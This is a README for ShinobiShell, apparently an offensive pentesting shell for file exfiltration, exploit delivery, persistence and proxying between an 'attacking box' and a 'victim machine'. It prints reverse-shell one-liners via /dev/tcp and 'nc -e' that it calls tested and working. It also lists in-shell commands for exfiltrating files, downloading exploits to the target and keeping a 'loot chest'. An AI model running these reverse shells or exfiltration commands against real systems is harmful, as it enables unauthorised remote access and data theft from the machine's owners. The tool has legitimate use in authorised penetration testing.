# ShinobiShell
An experimental shell that handles file exfiltration, exploit injection and various other obnoxious tasks.
```
usage: PROG [options]

Shinobi shell is a shell specifically designed to make exfiltration, proxying,
persistance and other pentesting actions easier.

optional arguments:
  -h, --help            show this help message and exit
  -a, --autoload	Listens for a incoming shell. Then autoloads shinobi shell onto the target
  -t, --ttyCheat        Shows tty shell cheat sheet (need a tty shell for shinobi shell to work)
  -c, --connect         Flag that indicates a reverse shell connection (use this on victim machine)
  -l LISTEN, --listen LISTEN
                        Starts Shinobi Shell listener on port passed in
  -k, --key             Will create an encrpyted tunnel if encrpytion libs available
  -r SERVERADDRESS, --serveraddress SERVERADDRESS
                        Local IP Address used for universal reverse shell
                        handler (optional - use if different than default)
```
## Start your server first:

### Server (Attacking box) 
`./shinobishell.py -l 4443 -k`

`-l` Port server will listen on

`-k` Requesting an encrypted tunnel server


## OPTION 1: Run Shinobi Shell manually on the victim machine

Client (Penetrated box) 
`./shinobishell.py -c -k ` 

`-c` Connect back to a server

`-k` Try and make an encrytped tunnel

For both server and client, you'll be propmted for a password when using `-k`

For `-c` you will be prompted at run time for the server address

Both `-c` and `-k` were moved to runtime inputs to prevent leaking attacking machine address and key in bash history

## OPTION 2: Start a Shinobi Shell listener on your attacking machine and send it a shell

### Attacking Machine

`./shinobishell.py -a`
> Shinobi Tunnel Plaintext ~~ Be aware

> Which port to listen on: 1000

> What is the ShinobiServer address:port combination: 127.0.0.1:443


### Victim Machine

Send a reverse shell 

(tested and known to work)

`/bin/bash -i >& /dev/tcp/127.0.0.1/1000 0>&1`

`nc 127.0.0.1 1000 -e /bin/bash`

`nc 127.0.0.1 1000 -e /bin/sh`


## -h --help Help output

```
Shinobi Shell v1.0
Author: Anthony Russell
Contact: Twitter @DotNetRussell
Blog: https://DotNetRussell.com  (don't hack me bro)

Commands:

help -                      displays help information
machineinfo -               displays a series of machine variables to help with priv esc
searchsploit -              <search text> sends a searchsploit command back to your attacking machine and returns the results through shinobi tunnel
exfil <file name> -         exfiltrates a file back to your attacking machine via shinobi tunnel
ssdownload <exploit path> - downloads a search sploit exploit from your attacking machine
download <url> -            does a wget for your file on your attacking machine and then transfers it to you over shinobi tunnel
linenumdownlods -           linenum.sh to the Shinobi Server and then transfers it back to the client

Loot Chest:

loot store <key> <value> -  stores a key value pair in your loot chest
loot <key> -                gets a loot value
loot show -                 shows everything in loot chest

NOTE: Loot chest auto syncs with attacking machine
	
Auto Aliases
lsa == ls -la
```
